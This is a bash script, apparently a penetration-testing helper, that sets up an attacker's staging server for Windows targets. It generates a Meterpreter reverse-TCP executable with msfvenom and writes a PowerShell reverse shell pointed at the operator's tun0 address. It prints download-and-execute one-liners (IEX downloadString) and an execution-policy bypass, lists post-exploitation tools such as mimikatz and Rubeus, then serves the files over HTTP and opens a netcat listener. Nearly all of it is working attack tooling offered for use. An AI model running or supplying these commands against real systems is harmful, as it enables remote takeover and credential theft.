#!/bin/bash
# coding:UTF-8

# -------------------------------------------------------------------------------------
#                                Windows HTTP Server 
#                BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)
# -------------------------------------------------------------------------------------

# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : 2.0                                                                
# Details : Create two universal system files - payload.exe and reverseshell.ps1
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

ifconfig tun0 | grep 'inet ' | awk '{print $2}' | sed 's/addr://' > file.txt
cp template.txt reverseshell.ps1

filename="file.txt"
while read line
  do 
  echo "Invoke-PowerShellTcp -Reverse -IPAddress $line -Port 9001" >> ./reverseshell.ps1
  mv reverseshell.ps1 ./ALL/reverseshell.ps1
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=$line LPORT=6666 --platform windows -f exe -o ./ALL/winpayload.exe
done < $filename

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : 2.0                                                                
# Details : Display my universal banner.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

clear
echo "\t__        _____ _   _ ____   _____        ______    _   _ _____ _____ ____    ____  _____ ______     _______ ____   "
echo "\t\ \      / /_ _| \ | |  _ \ / _ \ \      / / ___|  | | | |_   _|_   _|  _ \  / ___|| ____|  _ \ \   / / ____|  _ \  "
echo "\t \ \ /\ / / | ||  \| | | | | | | \ \ /\ / /\___ \  | |_| | | |   | | | |_) | \___ \|  _| | |_) \ \ / /|  _| | |_) | "
echo "\t  \ V  V /  | || |\  | |_| | |_| |\ V  V /  ___) | |  _  | | |   | | |  __/   ___) | |___|  _ < \ V / | |___|  _ <  "
echo "\t   \_/\_/  |___|_| \_|____/ \___/  \_/\_/  |____/  |_| |_| |_|   |_| |_|     |____/|_____|_| \_\ \_/  |_____|_| \_\ "
echo "\t                                                                                                                    "
echo "\t                                BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)                               "
echo "\n"

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : 2.0                                                             
# Details : Start the HTTP Serever.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

echo "Startup Instructions:"
echo "Get-ExecutionPolicy -List"
echo "Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted"

filename="file.txt"
while read line
  do 
  echo "If needed: powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/reverseshell.ps1)'\""
  echo "\nOtherwise: powershell \"iwr -Uri http://$line:8000/filename\" -outfile filename"
done < $filename

echo "\nENUMERATION			SHELLS				RUNNING PROCESSES		COMMUNICATIONS			CORE EXPLOITS		"
echo "----------------------------------------------------------------------------------------------------------------------------------------------------------"
echo "jawsenum.ps1\"			winpayload.exe\"		\tpowerup.ps1\"			nc.exe\"			\tmimidump.ps1\"	"
echo "sharphound.ps1\"			webshell.php\"			powercat.ps\"			plink.exe\"			mimikatz.ps1\"		"
echo "sharphound.exe\"							powerview.ps1\"							winpwn.ps1\"		"
echo "winpeas32.exe\"							powermad.ps1\"							lovelypotato.ps1\"	"
echo "winpeas64.exe\"							procdump32.exe\"						\tmimikatz64.exe\"	"
echo "rubeus.exe\"							procdump64.exe\"						\tmimikatz32.exe\"	"
echo "nmapsetup.exe\"																		"
echo "----------------------------------------------------------------------------------------------------------------------------------------------------------"

exec python -m SimpleHTTPServer > output.txt &
rlwrap nc -lvnp 9001

#Eof
